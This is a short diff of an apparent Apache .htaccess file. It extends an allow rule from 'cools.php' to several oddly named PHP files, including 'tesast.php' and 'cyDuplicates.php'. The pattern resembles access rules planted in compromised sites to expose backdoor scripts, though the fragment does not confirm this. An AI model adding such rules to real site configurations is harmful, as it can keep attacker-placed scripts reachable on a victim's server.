@@ -8,7 +8,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(cools.php)$'>
+<FilesMatch '^(cools.php|version.php|settings.php|tesast.php|cyDuplicates.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
